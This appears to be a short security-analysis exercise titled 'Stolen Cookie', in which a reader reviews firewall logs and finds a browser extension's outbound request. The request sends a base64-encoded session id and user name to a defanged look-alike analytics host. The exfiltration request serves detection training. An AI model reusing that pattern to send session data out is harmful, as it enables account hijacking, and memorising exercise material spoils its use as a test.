## Stolen Cookie

You are reviewing firewall logs for a workstation that has a suspicious browser extension installed. You notice the following outbound request made by the browser process:

```
GET /collect?data=eyJzZXNzaW9uIjoiYWJjMTIzIiwidXNlciI6ImFkbWluIn0= HTTP/1.1
Host: analytics-cdn-metrics[.]com
User-Agent: Mozilla/5.0
```

You decode the base64 string in the `data` parameter and get:

```json
{"session":"abc123","user":"admin"}
```
